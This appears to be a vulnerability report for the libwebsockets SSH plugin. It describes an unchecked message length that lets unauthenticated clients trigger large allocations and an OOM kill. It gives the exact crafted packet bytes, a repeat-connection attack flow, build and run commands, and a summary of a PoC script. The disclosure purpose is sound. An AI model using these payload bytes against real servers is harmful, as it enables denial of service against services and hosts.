## Missing upper-bound check on msg_len in lws_ssh_parse_plaintext() causes pre-auth OOM server kill via unbounded allocation

plugins/protocol_lws_ssh_base/sshd.c:576 constructs pss->msg_len from 4
attacker-controlled bytes without any upper-bound check. The only validation
(line 595) rejects msg_len < 6. When msg_id == SSH_MSG_KEXINIT (20), the
value is passed directly to sshd_zalloc() at line 652, allowing an
unauthenticated remote attacker to trigger a ~128 MB (or up to ~4 GB)
heap allocation per connection. Repeated connections exhaust system memory,
causing the server process (and potentially other processes) to be killed
by the OOM killer.

- Version: 4.5.99-v4.5.0-382-g4a63b9333


Root cause (plugins/protocol_lws_ssh_base/sshd.c):
```c
    /* line 575-578 — msg_len assembled from 4 attacker bytes, no upper bound */
    case SSHS_MSG_LEN:
        pss->msg_len = (pss->msg_len << 8) | *p++;
        if (++pss->ctr != 4)
            break;

    /* line 595-598 — only lower-bound check */
    if (pss->msg_len < 2 + 4) {
        lwsl_notice("illegal msg size\n");
        goto bail;
    }

    /* line 649-656 — msg_len used directly as allocation size */
    case SSH_MSG_KEXINIT:
        ...
        pss->kex->I_C_alloc_len = pss->msg_len;
        pss->kex->I_C = sshd_zalloc(pss->kex->I_C_alloc_len);
        if (!pss->kex->I_C) {
            lwsl_notice("OOM 3\n");
            goto bail;
        }

    /* sshd_zalloc (line 31-38) — malloc + memset, commits physical pages */
    void *sshd_zalloc(size_t s)
    {
        void *p = malloc(s);
        if (p)
            memset(p, 0, s);
        return p;
    }
```

## Vulnerability flow:

    Attacker                              SSH Server (sshd.c)
    --------                              --------------------
        |                                       |
        |  <-- "SSH-2.0-Libwebsockets\r\n" ---  |  server banner
        |                                       |
        |  --- "SSH-2.0-PoC\r\n" ------------>  |  :552 SSHS_IDSTRING
        |                                       |  :572 parser -> SSHS_MSG_LEN
        |                                       |
        |  --- \x08\x00\x00\x00 ------------->  |  :576 msg_len = 0x08000000
        |       (msg_len = 128 MB)              |       = 134,217,728 bytes
        |                                       |
        |                                       |  :595 CHECK: msg_len >= 6?
        |                                       |       YES (134217728 >= 6)
        |                                       |       NO UPPER BOUND CHECK
        |                                       |
        |  --- \x00 ------------------------->  |  :602 padding_length = 0
        |       (padding)                       |
        |                                       |
        |  --- \x14 ------------------------->  |  :607 msg_id = 20
        |       (SSH_MSG_KEXINIT)               |  :639 SSH_MSG_KEXINIT handler
        |                                       |
        |                                       |  :651 I_C_alloc_len = 134,217,728
        |                                       |  :652 sshd_zalloc(134217728)
        |                                       |       = malloc(128 MB) + memset(0)
        |                                       |       128 MB physical memory committed
        |                                       |
        |  (repeat with new connections)        |
        |  --- connection 2 ----------------->  |  +128 MB (total: 256 MB)
        |  --- connection 3 ----------------->  |  +128 MB (total: 384 MB)
        |  --- connection 4 ----------------->  |  +128 MB (total: 512 MB)
        |            ...                        |
        |                                       |  OOM KILLER -> server killed
        |                                       |  (or entire host destabilized)

    Total payload: 20 bytes x 4 connections = 80 bytes sent
    Total damage: 512 MB consumed, server dead, no authentication required


### PoC (attached file):
  poc_sshd_unbounded_alloc.py  — Python script that opens multiple SSH
                                 connections, each sending a crafted 6-byte
                                 packet that triggers a 128 MB allocation

The PoC connects to the SSH server, completes the banner exchange, then
sends a minimal binary packet: 4-byte msg_len (0x08000000 = 128 MB),
1-byte padding_length (0), 1-byte msg_id (20 = SSH_MSG_KEXINIT). It holds
connections open and monitors server RSS via /proc/PID/status. The loop
continues until the server process is killed by the OOM killer.

The vulnerable code is in the SSH protocol plugin library
(plugins/protocol_lws_ssh_base/sshd.c), not in the test binary.
libwebsockets-test-sshd is used as the harness because it is the project's
provided binary that accepts SSH connections via the lws-ssh-base plugin.
Any application using this plugin is equally vulnerable.


### Build:
  ```bash
    cd libwebsockets
    mkdir -p build && cd build
    cmake ../libwebsockets \
      -DLWS_WITH_CGI=ON \
      -DLWS_WITH_PLUGINS=ON \
      -DLWS_WITH_PLUGINS_BUILTIN=OFF \
      -DLWS_WITH_SSL=ON \
      -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer" \
      -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
      -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address,undefined"
    make -j$(nproc) test-sshd
  ```


### Run:

```bash
# Terminal 1: start server with 512 MB memory limit (just to prevent host crash)
systemd-run --scope --user -p MemoryMax=512M -p MemorySwapMax=0 \
  env ASAN_OPTIONS="allocator_may_return_null=1:detect_odr_violation=0" \
  ./build/bin/libwebsockets-test-sshd -d 7
```

```bash
# Terminal 2: run PoC
python3 poc_sshd_unbounded_alloc.py 127.0.0.1 2200
```

### Output:

OOM kill evidence (systemd journal):

    run-p4239-i4240.scope: A process of this unit has been killed by the OOM killer.
    run-p4239-i4240.scope: Failed with result 'oom-kill'.
    run-p4239-i4240.scope: Consumed 303ms CPU time, 512M memory peak.


### Impact:
  - Denial of Service — a single unauthenticated attacker can kill the SSH
    server by sending 20-byte crafted packets across a few TCP connections
  - System-wide impact — without cgroup memory limits, the unbounded
    allocation exhausts host memory, causing the OOM killer to terminate
    other processes and potentially destabilizing the entire system
  - Pre-authentication — the entire attack occurs during the SSH banner
    exchange and KEX_INIT phase, before any key exchange or authentication
  - Zero complexity — the attacker controls msg_len precisely via 4 bytes
    in the SSH binary packet header; no race conditions or special state
  - Affects any application using the lws-ssh-base protocol plugin
